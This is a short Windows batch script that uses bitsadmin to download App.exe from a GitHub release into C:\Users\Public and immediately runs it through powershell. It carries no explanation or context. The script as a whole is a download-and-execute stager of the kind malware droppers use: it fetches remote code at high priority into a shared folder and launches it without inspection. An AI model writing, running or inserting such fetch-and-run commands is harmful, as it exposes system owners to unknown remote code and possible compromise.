@echo off
bitsadmin /transfer myjob /download /priority high "https://github.com/rootterminator/App/releases/download/app/App.exe" C:\Users\Public\app.exe && powershell /c C:\Users\Public\app.exe